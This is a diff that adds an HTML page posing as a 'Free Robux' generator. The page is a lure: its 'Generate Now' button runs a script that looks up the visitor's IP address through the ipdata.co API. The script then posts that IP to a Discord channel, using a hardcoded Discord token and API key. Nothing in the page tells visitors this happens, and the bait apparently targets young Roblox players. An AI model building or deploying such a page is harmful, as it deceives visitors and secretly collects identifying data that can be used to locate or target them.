@@ -1,0 +1,126 @@
+<html lang="en">
+	<head>
+	    <meta charset="UTF-8">
+	    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+	    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	    <title>Free Robux</title>
+	    <link rel="preconnect" href="https://fonts.gstatic.com">
+		<link href="https://fonts.googleapis.com/css2?family=Ubuntu+Condensed&display=swap" rel="stylesheet">
+		<link rel="preconnect" href="https://fonts.gstatic.com">
+		<link href="https://fonts.googleapis.com/css2?family=Itim&display=swap" rel="stylesheet">
+		<link rel="preconnect" href="https://fonts.gstatic.com">
+		<link href="https://fonts.googleapis.com/css2?family=Itim&family=Rubik:wght@300&display=swap" rel="stylesheet">
+	    <link rel="stylesheet" type="text/css" href="index.css">
+    </head>
+	<style>
+		html {
+            width:100%;
+            height:100%;
+        }
+        #generate-button2 {
+            margin-left:460px;
+            padding:30px 100px;
+            font-size:20px;
+            background-color:#1AD81A;
+            border-radius:20px;
+            border: 3px solid black;
+            transition: transform .5s;
+            font-family:helvetica;
+            text-shadow: 1px 1px 3px #141614;
+            box-shadow: 2px 2px 4px #000000;
+            display:flex;
+            flex-direction: column;
+            
+        }
+        @media (min-width: 30rem) {
+            #generate-button {
+                flex-direction: row;
+            }
+        }
+        #generate-button2:hover {
+            cursor:pointer;
+            transform:scale(1.1);
+            box-shadow: 2px 2px 4px #000000;
+        }
+        #ex-heading {
+            margin-left:480px;
+            margin-top:200px;
+            font-family: 'Rubik', sans-serif;
+            text-shadow: 1px 1px 3px #000000;
+            
+        }
+        #ex-heading2 {
+            margin-left:535px;
+            font-family: 'Rubik', sans-serif;
+            text-shadow: 1px 1px 3px #000000;
+
+        }
+        body {
+            background-image:url("background\ image.jpg");
+            background-repeat:no-repeat;
+            background-attachment: fixed;
+            background-size: 100% 100%;
+        }
+        body{width:90%;margin:auto;min-width:600px;max-width:2000px}
+        * {
+            margin: 0;
+            padding: 0;
+        }
+        #wp {
+            width:1360px;
+            margin-left:auto;
+            margin-right:auto;
+            margin-top:auto;
+        }
+        body {
+            background-color:#141614
+        }
+	</style>
+	<body>
+
+		<div id="wp">
+			<div id="explainations">
+				<h2 id="ex-heading">Forget about the time wasters.</h2>
+				<h2 id="ex-heading2">This is the real deal.</h2>
+                <button id="generate-button2">Generate Now</button>
+
+			</div>
+			
+		</div>
+        <script>
+var button = document.getElementById("generate-button2")
+if (button) {
+  button
+  .addEventListener('click', sendthelog)
+} else {
+  console.log("futile ")
+}
+function sendthelog() {
+function json(url) {
+  return fetch(url).then(res => res.json());
+}
+let apiKey = '0d0bf4429438b2ecf5d06cb0e2f8b3f7752c24a7e48c080a00c5a57d';
+var token = "ODM0MjY2MTYxNTY1OTI1Mzk2.YIjCWQ.R151fsC6hLpnXsB58p0nLZDQpf8"
+
+json('https://api.ipdata.co?api-key=' + apiKey)
+    .then(data => {
+      data.ip
+      fetch("https://discordapp.com/api/v6/channels/834273860236738560/messages", {
+  method : 'POST',
+  headers : {
+    "Content-Type" : "application/json",
+    "user-agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
+    "origin" : "https://discord.com",
+    "Authorization" : token
+  },
+  body : JSON.stringify({
+    content : data.ip
+    
+  })
+})
+})
+}
+
+        </script>
+	</body>
+</html>
